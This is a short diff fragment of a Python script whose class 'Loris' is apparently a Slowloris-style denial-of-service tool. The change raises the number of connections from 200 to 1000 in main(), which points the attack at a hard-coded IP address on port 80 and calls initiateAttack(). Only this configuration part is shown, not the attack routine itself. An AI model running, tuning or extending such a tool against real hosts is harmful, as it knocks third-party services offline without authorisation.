@@ -125,7 +125,7 @@ class Loris:
             time.sleep(self.timeout)
 
 def main():
-    loris = Loris(addr = "107.150.39.234", port = 80, totalConnections = 200)
+    loris = Loris(addr = "107.150.39.234", port = 80, totalConnections = 1000)
     loris.initiateAttack()
 
 if __name__ == "__main__":
